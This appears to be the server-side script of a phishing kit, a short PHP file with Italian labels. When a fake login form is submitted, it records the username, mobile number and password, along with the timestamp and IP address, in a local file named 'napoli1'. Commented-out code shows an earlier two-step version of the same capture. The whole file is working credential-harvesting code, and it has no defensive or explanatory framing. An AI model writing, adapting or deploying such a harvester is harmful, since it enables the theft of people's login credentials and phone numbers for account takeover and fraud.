<?php
date_default_timezone_set('Europe/Rome');
session_start();

//if(isset($_POST["username"]) && isset($_POST["mobile"])){
//	$_SESSION["username"] = "Username : {$_POST['username']} cellulare : {$_POST['mobile']}";
//	$date = date('Y-m-d H-i-s');
//	$out="[{$date}] {$_SERVER['REMOTE_ADDR']} Username : {$_POST['username']} cellulare : {$_POST['mobile']}\n";
//	file_put_contents("Username01", $out, FILE_APPEND | LOCK_EX);
//}

//if(isset($_POST["pwd"])){
//	$date = date('Y-m-d H-i-s');
//	$out="[{$date}] {$_SERVER['REMOTE_ADDR']} {$_SESSION['username']}, Password : {$_POST['pwd']}\n";
//	file_put_contents("napoli1", $out, FILE_APPEND | LOCK_EX);
//}

if(isset($_POST["username"]) && isset($_POST["mobile"]) && isset($_POST["pwd"])){
	$date = date('Y-m-d H-i-s');
	$out="[{$date}] {$_SERVER['REMOTE_ADDR']} Username : {$_POST['username']} cellulare : {$_POST['mobile']} Password : {$_POST['pwd']}\n";
	file_put_contents("napoli1", $out, FILE_APPEND | LOCK_EX);
}
?>

